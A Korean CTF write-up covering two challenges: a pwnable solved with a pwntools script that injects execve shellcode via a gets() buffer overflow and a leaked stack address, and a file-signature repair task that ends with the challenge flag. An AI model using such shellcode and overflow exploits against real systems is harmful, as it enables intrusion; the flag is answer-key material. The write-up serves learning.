EnteredSHELL, 열어보시지요
=================
EnteredSHELL
---------------------------
이 문제는 포너블 분야의 문제로 수준은 LOB 1단계 급 수준이다.

파일은 32bit로 컴파일 되어있으며, 보호기법은 걸려있지 않다.

main함수를 보자.

![텍스트](https://i.imgur.com/utNEvRC.png)

vuln 함수를 호출해준다. 바로 vuln 함수를 보자.

![텍스트](https://i.imgur.com/MDx4rQm.png)

gets로 s변수에 입력을 받으므로 Buffer overflow가 일어난다는 사실이 자명하다.

심지어 이 파일은 NX도 걸려있지 않고, canary도 걸려있지 않으므로, 스택으로 eip을 돌려서shellcode를 실행시켜주면 될 것이다.

하지만 실 서버에는 ASLR이 걸려있기 때문에 stack으로 eip를 돌리는 게 힘들 것이라고 생각을 할 수 있다. 그렇지만, printf로 stack address를 스스로 leak 해준다.

그러므로 시나리오는 stack에 gets로 값을 받음을 이용, shellcode를 stack에 넣어주고, eip를 leak된 값을 이용해서 stack address로 옮겨주면 된다.	끝

~~~
from pwn import *
p = process('./EnteredSHELL')
#p = remote('52.78.156.241', 7777)

p.recvuntil(' : ')
leak = int(p.recv()[:8],16)
shell = '\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
pay = shell + 'a'*234 + p32(leak)
log.info('stack : ' + hex(leak))
p.sendline(pay)
p.recvuntil(p32(leak) + '\n')
p.interactive()
~~~

![텍스트](https://imgur.com/zP1JqEM.png)

서버가 닫혀있어서 플래그는 모르겠다.

![텍스트](https://imgur.com/8xRi18e.png)

열어보시지요
---------------------------

이 문제는 리버싱 분야의 문제로 출제됐다.

사실 포렌식 문제라고 보는 게 더 맞을 거 같다는 생각이 든다.

![텍스트](https://imgur.com/vsYymB2.png)

처음에 zip 압축 풀고 폴더 열어보면 이렇게 “열어보시지요”라는 파일들이 각각의 파일 확장자를 가진 상태로 주어져있다. 

그 상태에서 파일을 열어보면 잘 열리는 파일들이 있다.

![텍스트](https://imgur.com/C2gakgK.png)

이런 식으로 아마 pdf, pptx파일은 잘 열린다.

![텍스트](https://imgur.com/JjWDrNB.png)

하지만 그 두 파일이 아닌 나머지 파일은 이런 식으로 열리지 않는다.

열리지 않는 이유는 간단하게 맨 앞 몇 바이트 부분을 차지하는 파일 시그니처 부분이 다른 값으로 바뀌어져 있기 때문이다.

![텍스트](https://imgur.com/y1DUHGi.png)

위 사진과 같이 hxd로 파일들을 확인해본다면, 왼쪽의 원래 확장자와 맞는 파일 시그니처와 오른쪽의 받은 파일에 시그니처가 값이 다르다.

그래서 앞 부분 파일 시그니처의 몇 바이트 부분을 확장자에 맞는 값으로 바꿔주면 파일이 열리게 된다.

![텍스트](https://imgur.com/lQwP2Lj.png)

이런식으로 값을 바꿔주게 된다면, 파일이 열리고 플래그의 일부분이 보이게 될 것이며, 모든 파일을 순서대로 읽어온다면 모든 플래그를 읽어올 수 있다.

![텍스트](https://imgur.com/sNME4LW.png)

이렇게 열리지 않던 파일이 열리게 됨으로써 문제가 풀리게 된다.

# FLAG : 1_m!Ss__the__moooHaaaanDOJEON
